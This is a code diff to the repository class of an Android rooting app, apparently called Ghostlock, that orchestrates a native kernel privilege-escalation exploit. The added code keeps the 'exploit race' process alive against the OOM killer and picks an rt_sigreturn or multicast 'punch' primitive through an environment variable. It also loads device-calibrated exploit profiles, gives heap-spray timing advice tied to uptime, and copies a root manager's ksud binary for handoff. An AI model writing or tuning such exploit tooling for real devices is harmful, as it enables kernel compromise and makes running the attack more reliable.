@@ -3,13 +3,15 @@ package com.ghostlock.app.data
 import android.annotation.SuppressLint
 import android.content.ContentValues
 import android.content.Context
+import android.content.Intent
 import android.os.Build
 import android.provider.MediaStore
+import android.system.Os
 import androidx.core.content.edit
 import androidx.core.net.toUri
 import com.ghostlock.app.BuildConfig
 import com.ghostlock.app.BuildInfo
-import com.ghostlock.app.data.ManagerScanner
+import com.ghostlock.app.KeepAliveService
 import com.ghostlock.app.domain.model.CpuPair
 import com.ghostlock.app.domain.model.DebugSettings
 import com.ghostlock.app.domain.model.KernelSnapshot
@@ -17,6 +19,7 @@ import com.ghostlock.app.domain.model.OffsetCandidate
 import com.ghostlock.app.data.ota.OtaPayloadExtractor
 import com.ghostlock.app.domain.model.OffsetImportResult
 import com.ghostlock.app.domain.model.ParseResult
+import com.ghostlock.app.domain.model.ParseVerdict
 import com.ghostlock.app.domain.model.ProfileConfig
 import com.ghostlock.app.domain.model.UserProfileFile
 import com.ghostlock.app.domain.repository.GhostlockRepository
@@ -50,6 +53,13 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         const val PrefDebugExportLocation = "debug_export_location"
         const val PrefDebugKernelLogEnabled = "debug_kernel_log_enabled"
         const val PrefDebugProfileOverrides = "debug_profile_overrides"
+        /* Punch the native binary must use for an on-device derived profile.
+         * Written by the importer when the extractor's analysis says the
+         * rt_sigreturn route is the feasible one; keyed by release so a stale
+         * entry from another kernel can never be applied. */
+        const val PrefPunchRelease = "punch_release"
+        const val PrefPunchMode = "punch_mode"
+        const val AnalysisFileName = "analysis.json"
 
         /* U01-S14: per-run KernelSU log name; the resolved path travels to
          * the native process via GHOSTLOCK_KSU_LOG. */
@@ -201,20 +211,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         if (enabled) shizukuRunner.requestPermission()
     }
 
-    override fun selectedManagerPackage(): String? =
-        preferences.getString(ManagerScanner.PREF_KEY, null)?.takeIf { it.isNotBlank() }
-
-    override fun setSelectedManagerPackage(pkg: String?) {
-        preferences.edit { putString(ManagerScanner.PREF_KEY, pkg) }
-    }
-
-    override suspend fun installedManagers(): List<ManagerScanner.Candidate> =
-        withContext(Dispatchers.IO) {
-            runCatching {
-                ManagerScanner.scan(appContext.packageManager, appContext.packageName)
-            }.getOrDefault(emptyList())
-        }
-
     override fun profileController(): ProfileConfigController = profileController
 
     /* debug-ui: preferences for the hidden debug screen. */
@@ -312,6 +308,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         onLog: (String) -> Unit,
     ): ParseResult {
         val parsedFile = File(filesDir, "offsets_parse.tmp")
+        val analysisFile = File(filesDir, AnalysisFileName)
         var tempBootFile: File? = null
         var tempXblFile: File? = null
         return try {
@@ -321,7 +318,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     pendingParsedDocument = null
                     dropReplacedDocuments(pending.releases)
                     userProfileStore.save(pending.name, pending.text)
-                    return ParseResult.Parsed(pending.releases, pending.missing, pending.name)
+                    return ParseResult.Parsed(
+                        pending.releases, pending.missing, pending.name, pending.verdict,
+                    )
                 }
             }
             val binary = File(appContext.applicationInfo.nativeLibraryDir, ExtractBinaryName)
@@ -346,6 +345,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             }
 
             parsedFile.delete()
+            analysisFile.delete()
             val args = buildList {
                 add(effectiveInput)
                 if (effectiveXblPath != null) {
@@ -364,6 +364,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                  * profile (no includes, credential template inlined), so the
                  * stored document needs no legacy conversion. */
                 addAll(listOf("--format", "conf", "--out", parsedFile.absolutePath, "--work-dir", filesDir.absolutePath))
+                /* Same pass also yields the verdict, so the profile and the
+                 * "can this device run it" answer never disagree. */
+                addAll(listOf("--analysis-json", analysisFile.absolutePath))
             }
             onLog("<k> extract: $effectiveInput")
             val code = runProcess(
@@ -376,7 +379,18 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 timeoutSeconds = 1800,
             )
             onLog("<k> extract exit code=$code")
-            if (code != 0 || !parsedFile.isFile) return ParseResult.Failed(code)
+            if (code != 0 || !parsedFile.isFile) {
+                /* A refusal carries a reason (too old, already patched, ...).
+                 * Surface it as a verdict instead of a bare exit code. */
+                val refusal = ParseVerdictParser.parse(
+                    runCatching { analysisFile.readText() }.getOrNull(),
+                )
+                if (refusal != null) return ParseResult.Rejected(refusal, code)
+                return ParseResult.Failed(code)
+            }
+            val verdict = ParseVerdictParser.parse(
+                runCatching { analysisFile.readText() }.getOrNull(),
+            )
             val document = parsedFile.readText()
             val fresh = parseEntries(document) ?: return ParseResult.Failed(code, "invalid extractor output")
             /* Parsed reports are stored as-is, even when they match a bundled
@@ -389,45 +403,90 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             val overlaps = releases.filter { userProfileStore.containsRelease(it) }
             val name = parsedDocumentName(releases)
             if (!overwrite && overlaps.isNotEmpty()) {
-                pendingParsedDocument = PendingParsedDocument(name, document, releases, missing)
+                pendingParsedDocument = PendingParsedDocument(name, document, releases, missing, verdict)
                 return ParseResult.RequiresOverwrite(overlaps, missing)
             }
             dropReplacedDocuments(releases)
             userProfileStore.save(name, document)
-            ParseResult.Parsed(releases, missing, name)
+            verdict?.let { rememberPunch(releases, it) }
+            ParseResult.Parsed(releases, missing, name, verdict)
         } catch (error: CancellationException) {
             throw error
         } catch (error: Exception) {
             ParseResult.Failed(1, error.message)
         } finally {
             parsedFile.delete()
+            analysisFile.delete()
             tempBootFile?.delete()
             tempXblFile?.delete()
         }
     }
 
+    /**
+     * Keeps the process above the LMK/OOM killer while the exploit race runs.
+     * ColorOS freezes background apps aggressively, and a SIGKILL of the armed
+     * process wedges the futex subsystem. Purely a process-priority measure:
+     * no device state is touched.
+     */
+    private suspend fun <T> withKeepAlive(block: suspend () -> T): T {
+        runCatching {
+            appContext.startService(
+                Intent(appContext, KeepAliveService::class.java)
+                    .setAction(KeepAliveService.ACTION_START),
+            )
+        }
+        try {
+            return block()
+        } finally {
+            runCatching {
+                appContext.stopService(Intent(appContext, KeepAliveService::class.java))
+            }
+        }
+    }
+
     override suspend fun runExploit(pair: CpuPair, onLog: (String) -> Unit): Int =
-        withDebugAttackLog("direct", onLog) { archivedLog, debugDir, writeSidecar ->
-            runExploitBinary(pair, "libghostlock.so", archivedLog, debugDir, writeSidecar)
+        withKeepAlive {
+            withDebugAttackLog("direct", onLog) { archivedLog, debugDir, writeSidecar ->
+                runExploitBinary(pair, "libghostlock.so", archivedLog, debugDir, writeSidecar)
+            }
         }
 
     override suspend fun runExploitWithShizuku(pair: CpuPair, onLog: (String) -> Unit): Int {
-        return withDebugAttackLog("shizuku", onLog) { archivedLog, debugDir, writeSidecar ->
+        return withKeepAlive {
+            withDebugAttackLog("shizuku", onLog) { archivedLog, debugDir, writeSidecar ->
             archivedLog("<s> resolving profile")
             val release = System.getProperty("os.version", "").orEmpty()
             val config = profileController.load(release, pair)
-            val profileBlob = profileController.nativeDocument(config)
+            /* The UserService runs in another process and receives only the
+             * GLK1 blob (no punch field), reading the punch from shared prefs.
+             * Publish it here so a device-derived `punch = "sigret"` profile
+             * reaches the Shizuku path too; otherwise it silently falls back
+             * to the MCAST_BLOCK_SOURCE punch and W1 writes nothing. */
+            if (!config.punch.isNullOrEmpty()) {
+                preferences.edit {
+                    putString(PrefPunchRelease, release)
+                    putString(PrefPunchMode, config.punch)
+                }
+            }
+            /* PHY110: device-verified prebuilt GLK1 wins over conf resolution. */
+            val prebuiltBlob = Phy110Profiles.prebuiltBlob(appContext, release)
+            val profileBlob = prebuiltBlob ?: profileController.nativeDocument(config)
+            if (prebuiltBlob != null) {
+                archivedLog(
+                    "<s> prebuilt GLK1 profile in use: ${prebuiltBlob.size} bytes (device-verified)",
+                )
+            }
             archivedLog(
                 "<s> profile resolved hasProfile=${config.hasProfile} " +
                     "blob=${profileBlob?.size ?: 0} invalid=${config.invalidPaths.size}",
             )
             when {
-                !config.hasProfile || profileBlob == null -> {
+                profileBlob == null || (prebuiltBlob == null && !config.hasProfile) -> {
                     archivedLog("<s> error: profile is unavailable for $release")
                     1
                 }
 
-                config.invalidPaths.isNotEmpty() -> {
+                prebuiltBlob == null && config.invalidPaths.isNotEmpty() -> {
                     archivedLog(
                         "<s> error: profile has ${config.invalidPaths.size} invalid field(s): " +
                             config.invalidPaths.take(6).joinToString(),
@@ -445,14 +504,17 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     }
                     dumpRuntimeProfile(archivedLog, writeSidecar, release, pair, runtimeBlob)
                     archivedLog("<b> starting UserService")
+                    // PHY110 discipline: record this boot; a second run in the
+                    // same boot panics reliably.
+                    Phy110Guard.markRun()
                     resetRunState()
                     shizukuRunner.run(
-                        pair, safeModeEnabled, forceAttackTest, profileBlob, debugDir,
-                        selectedManagerPackage(), archivedLog,
+                        pair, safeModeEnabled, forceAttackTest, profileBlob, debugDir, archivedLog,
                     ) { step, status ->
                         if (status == "disabled") clearRunState() else applyRunStatus(step, status)
                     }
                 }
+            }
             }
         }
     }
@@ -593,8 +655,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         return try {
             val binary = File(appContext.applicationInfo.nativeLibraryDir, binaryName)
             require(binary.isFile) { "missing native binary: ${binary.absolutePath}" }
-            val ksud = resolveKsudPath(onLog)
-            if (ksud != null) onLog("<k> ksud ready: ${ksud.absolutePath}") else onLog("<k> warning: ksud not found")
+            if (prepareKsud(workDir, onLog) != null) onLog("<k> ksud ready") else onLog("<k> warning: ksud not found")
             // U01-S14: a per-run KernelSU log path so a previous run's markers
             // can never satisfy the handoff probe; passed to the native process.
             val ksuLog = File(workDir, ksuLogName(System.currentTimeMillis()))
@@ -602,24 +663,59 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             nativeLog.writeText("")
             val release = System.getProperty("os.version", "").orEmpty()
             val config = profileController.load(release, pair)
+            /* The slab layout the heap spray depends on drifts as the device
+             * runs: a boot that has been up for hours gives a much worse draw
+             * than a fresh one, and W1 turns a missed draw into a failed run.
+             * Surface the uptime so a failure on a long boot is not mistaken
+             * for a broken profile. */
+            val bootMinutes = android.os.SystemClock.elapsedRealtime() / 60000L
+            onLog("<k> boot uptime: ${bootMinutes} min")
+            if (bootMinutes > 30L) {
+                onLog(
+                    "<k> note: long uptime; if the first write misses, reboot and " +
+                        "retry within a couple of minutes",
+                )
+            }
             onLog(
                 "<k> profile: hasProfile=${config.hasProfile} " +
                     "invalid=${config.invalidPaths.size} release=$release",
             )
-            if (!config.hasProfile) {
-                error(
-                    "no profile matched $release; import its .conf and select it, " +
-                        "or pick a built-in release",
-                )
+            /* PHY110: the device-verified GLK1 v2 blob ships verbatim in
+             * assets/prebuilt/. It carries the calibrated multicast_waiter
+             * geometry (route=3) and the tuned execution stages that the
+             * conf converter cannot reproduce byte for byte, so it wins over
+             * conf resolution whenever it exists for this kernel. */
+            val prebuiltBlob = Phy110Profiles.prebuiltBlob(appContext, release)
+            if (prebuiltBlob != null) {
+                onLog("<k> prebuilt GLK1 profile in use: ${prebuiltBlob.size} bytes (device-verified)")
+            } else {
+                if (!config.hasProfile) {
+                    error(
+                        "no profile matched $release; import its .conf and select it, " +
+                            "or pick a built-in release",
+                    )
+                }
+                if (config.invalidPaths.isNotEmpty()) {
+                    error(
+                        "profile has ${config.invalidPaths.size} invalid field(s): " +
+                            config.invalidPaths.take(6).joinToString(),
+                    )
+                }
             }
-            if (config.invalidPaths.isNotEmpty()) {
-                error(
-                    "profile has ${config.invalidPaths.size} invalid field(s): " +
-                        config.invalidPaths.take(6).joinToString(),
-                )
-            }
-            var profileBlob = profileController.nativeDocument(config)
+            var profileBlob = prebuiltBlob
+                ?: profileController.nativeDocument(config)
                 ?: error("profile is unavailable for $release")
+            /* The Shizuku UserService runs in its own process and receives only
+             * the GLK1 blob, which has no punch field. Publishing the resolved
+             * punch here keeps both launch paths on the same copy primitive;
+             * without it a device-derived `punch = "sigret"` profile silently
+             * falls back to the MCAST_BLOCK_SOURCE punch and W1 writes nothing. */
+            if (!config.punch.isNullOrEmpty()) {
+                preferences.edit {
+                    putString(PrefPunchRelease, release)
+                    putString(PrefPunchMode, config.punch)
+                }
+            }
             // v2: safe_mode lives in the meta section; there is no fixed slot
             // offset, so the blob is rescanned and rewritten.
             if (safeModeEnabled) {
@@ -635,11 +731,32 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             val nativeSink: (String) -> Unit = { line ->
                 if (!handleStatusLine(line, processRef)) onLog(line)
             }
+            val peakRssKb = AtomicLong()
             val tailer = Thread {
+                var tick = 0
                 try {
                     while (!Thread.currentThread().isInterrupted) {
                         tailKsuLog(nativeLog, nativeOffset, nativeSink)
                         tailKsuLog(ksuLog, ksuOffset, ksuSink)
+                        /* The native process carries every spray after the first
+                         * write, so a system kill (exit 137) is almost always
+                         * memory pressure. Sampling its peak RSS while it is
+                         * still alive is the only way to keep that evidence:
+                         * /proc/<pid> disappears the moment it is killed. */
+                        if (tick % 5 == 0) {
+                            processRef.get()?.let { process ->
+                                /* statm's second field is the resident page
+                                 * count; /proc/<pid>/status is larger and the
+                                 * read can race a fast death. */
+                                val rss = runCatching {
+                                    File("/proc/${process.pid()}/statm").readText()
+                                        .trim().split(' ').getOrNull(1)
+                                        ?.toLongOrNull()?.times(4)
+                                }.getOrNull()
+                                if (rss != null && rss > peakRssKb.get()) peakRssKb.set(rss)
+                            }
+                        }
+                        tick++
                         Thread.sleep(200)
                     }
                 } catch (_: InterruptedException) {
@@ -670,9 +787,23 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     environment()["TMPDIR"] = workDir.absolutePath
                     environment()["HOME"] = workDir.absolutePath
                     environment()["GHOSTLOCK_KSU_LOG"] = ksuLog.absolutePath
-                    if (ksud != null) environment()["GHOSTLOCK_KSUD"] = ksud.absolutePath
+                    /* PHY110: the prebuilt blob is calibrated for the 64-bit
+                     * rt_sigreturn fpsimd punch; the default
+                     * MCAST_BLOCK_SOURCE punch is infeasible on this kernel.
+                     * A profile imported from an on-device derivation carries
+                     * the same statement in its own `punch` key, so it keeps
+                     * working after the preference store is cleared. */
+                    if (prebuiltBlob != null ||
+                        config.punch == "sigret" ||
+                        punchMode(release) == "sigret"
+                    ) {
+                        environment()["GL_PUNCH"] = "sigret"
+                    }
                 }
             onLog("<b> starting native: ${binary.absolutePath}")
+            // PHY110 discipline: the futex subsystem stays armed after any run,
+            // so record this boot and refuse a second run in the same boot.
+            Phy110Guard.markRun()
             resetRunState()
             try {
                 val nativeCode = runProcess(
@@ -684,6 +815,25 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     onProcess = { processRef.set(it) },
                 )
                 onLog("<b> native exited code=$nativeCode")
+                val peakMb = peakRssKb.get() / 1024
+                if (peakMb > 0) onLog("<k> native peak rss: ${peakMb} MB")
+                if (nativeCode == 137) {
+                    /* The native side already reports its own rss/hwm with
+                     * [mem] lines; only mention the sampler when it produced a
+                     * reading, so a failed sample cannot masquerade as data. */
+                    val rssNote = if (peakMb > 0) "; peak rss=${peakMb} MB" else ""
+                    if (closeRequested) {
+                        onLog("<k> native killed by the app shutting down (close()), not by the system")
+                    } else {
+                        /* 128 + SIGKILL with no shutdown in flight: nothing
+                         * inside the exploit sends it, so the kill came from
+                         * outside - the kernel OOM killer, lmkd, or a vendor
+                         * root guard reaping the process group. */
+                        onLog("<k> native was SIGKILLed externally$rssNote")
+                    }
+                } else if (nativeCode == 143) {
+                    onLog("<k> native was SIGTERMed (128+15)")
+                }
                 nativeCode
             } finally {
                 withContext(Dispatchers.IO) {
@@ -881,6 +1031,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun close() {
         shizukuRunner.close()
         synchronized(processes) {
+            if (processes.isNotEmpty()) closeRequested = true
             processes.forEach(Process::destroyForcibly)
             processes.clear()
         }
@@ -908,6 +1059,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         val text: String,
         val releases: List<String>,
         val missing: Set<String>,
+        val verdict: ParseVerdict? = null,
     )
 
     /**
@@ -933,7 +1085,32 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     private fun isKernelSupported(): Boolean {
         val version = System.getProperty("os.version", "").orEmpty()
+        /* PHY110: a device-verified prebuilt GLK1 profile is itself a supported
+         * kernel configuration. The conf catalog is deliberately left without
+         * an entry for this release so that an unverified, converted profile
+         * can never silently replace the calibrated blob (the prebuilt always
+         * wins in the run paths below). */
+        if (Phy110Profiles.prebuiltBlob(appContext, version) != null) return true
         return version in builtinProfiles.unames || importedOffsetsMatch(version)
+    }
+
+    /** Remember which punch this release's profile needs. */
+    private fun rememberPunch(releases: List<String>, verdict: ParseVerdict) {
+        /* A punch only matters when something will actually run: an unusable
+         * kernel must not leave a stale GL_PUNCH behind for a later import. */
+        if (verdict.level == "unusable") return
+        val release = verdict.release?.takeIf { it in releases } ?: releases.firstOrNull() ?: return
+        val punch = verdict.punch ?: return
+        preferences.edit {
+            putString(PrefPunchRelease, release)
+            putString(PrefPunchMode, punch)
+        }
+    }
+
+    /** "sigret" when this release's profile needs the rt_sigreturn punch. */
+    private fun punchMode(release: String): String? {
+        if (preferences.getString(PrefPunchRelease, null) != release) return null
+        return preferences.getString(PrefPunchMode, null)
     }
 
     private fun importedOffsetsMatch(version: String): Boolean =
@@ -1032,16 +1209,57 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     private fun firstValidProperty(vararg keys: String): String? = keys.asSequence().firstNotNullOfOrNull { validDeviceName(systemProperty(it)) }
 
-    /** First ksud binary in resolvePackages order, or null. */
-    private fun resolveKsudPath(onLog: (String) -> Unit): File? {
-        val packages = ManagerScanner.resolvePackages(selectedManagerPackage())
-        for (packageName in packages) {
-            val source = runCatching {
-                File(appContext.packageManager.getApplicationInfo(packageName, 0).nativeLibraryDir, "libksud.so")
-            }.getOrNull()?.takeIf { it.isFile } ?: continue
-            return source
+    /**
+     * Locates a root manager that ships `libksud.so` and copies it out.
+     *
+     * Order comes from [ManagerScanner]: the manager picked in settings first,
+     * then the built-in KernelSU family, then anything else the scan found with
+     * a ksud payload. No package name is required for a manager to work.
+     */
+    private fun prepareKsud(workDir: File, onLog: (String) -> Unit): File? {
+        val chosen = preferences.getString(ManagerScanner.PREF_KEY, null)
+            ?.takeIf { it.isNotBlank() }
+        val scanned = runCatching {
+            ManagerScanner.scan(appContext.packageManager, appContext.packageName)
+        }.getOrElse {
+            onLog("<k> manager scan failed: ${it.message}")
+            emptyList()
         }
-        onLog("<k> no manager app with libksud.so found")
+        val withKsud = scanned.filter { it.hasKsud }
+        val ordered = (ManagerScanner.resolvePackages(chosen) +
+            withKsud.map { it.packageName }).distinct()
+        if (withKsud.isEmpty()) {
+            onLog("<k> no installed app provides libksud.so " +
+                "(install KernelSU / ReSukiSU / a fork)")
+            return null
+        }
+        if (withKsud.size > 1) {
+            onLog("<k> managers with ksud: " +
+                withKsud.joinToString { "${it.label}(${it.packageName})" })
+        }
+        for (packageName in ordered) {
+            val source = runCatching {
+                File(
+                    appContext.packageManager.getApplicationInfo(packageName, 0)
+                        .nativeLibraryDir.orEmpty(),
+                    "libksud.so",
+                )
+            }.getOrNull()?.takeIf { it.isFile } ?: continue
+            val output = File(workDir, "ksud")
+            val copied = runCatching {
+                source.inputStream().use { input -> output.outputStream().use { input.copyTo(it) } }
+                runCatching { Os.chmod(output.absolutePath, 448) }
+                output
+            }.getOrElse {
+                onLog("<k> copy ksud from $packageName failed: ${it.message}")
+                null
+            }
+            if (copied != null) {
+                onLog("<k> ksud source: $packageName")
+                return copied
+            }
+        }
+        onLog("<k> no readable libksud.so in ${ordered.size} candidate(s)")
         return null
     }
 
@@ -1141,5 +1359,14 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     }
 
     private val processes = mutableSetOf<Process>()
+
+    /**
+     * Set when this repository shuts down while a run is in flight. A 137 from
+     * the native side is otherwise indistinguishable between "the system
+     * killed it" and "we killed it ourselves on the way out", and the two need
+     * opposite fixes.
+     */
+    @Volatile
+    private var closeRequested = false
 
 }
